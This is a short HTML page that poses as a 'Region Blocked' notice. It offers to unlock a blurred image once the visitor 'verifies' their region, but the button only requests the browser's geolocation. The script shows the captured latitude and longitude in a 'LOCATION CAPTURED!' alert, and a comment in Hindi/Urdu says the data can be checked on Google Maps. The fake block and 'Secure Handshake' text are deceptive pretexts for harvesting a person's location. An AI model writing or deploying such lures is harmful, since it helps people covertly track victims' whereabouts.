<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access - PARDHAN</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 350px; }
        .image-preview { width: 100%; height: 180px; background: url('https://via.placeholder.com/400x200?text=Locked+Image'); background-size: cover; filter: blur(15px); border-radius: 8px; margin: 15px 0; border: 1px solid #444; }
        button { background-color: #238636; color: white; border: none; padding: 12px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        #status { margin-top: 15px; color: #58a6ff; font-size: 14px; }
    </style>
</head>
<body>

<div class="container">
    <h2 style="color: #f85149;">⚠️ Region Blocked</h2>
    <div class="image-preview" id="imageBox"></div>
    <p style="font-size: 13px;">Allow secure connection to verify your region and unlock the image.</p>
    <button onclick="startTest()">Unlock Content</button>
    <div id="status"></div>
</div>

<script>
    function startTest() {
        document.getElementById('status').innerText = "Requesting Secure Handshake...";
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    document.getElementById('status').innerText = "✅ Success!";
                    document.getElementById('imageBox').style.filter = "none";
                    // Alert for testing on mobile
                    alert(`📍 LOCATION CAPTURED!\n\nLatitude: ${lat}\nLongitude: ${lon}\n\nAb tum is data ko Google Maps par check kar sakte ho!`);
                },
                (err) => {
                    alert("Error: Please 'Allow' location to bypass the block.");
                    document.getElementById('status').innerText = "❌ Verification Failed";
                }
            );
        } else {
            alert("Your browser is too old!");
        }
    }
</script>

</body>
</html>
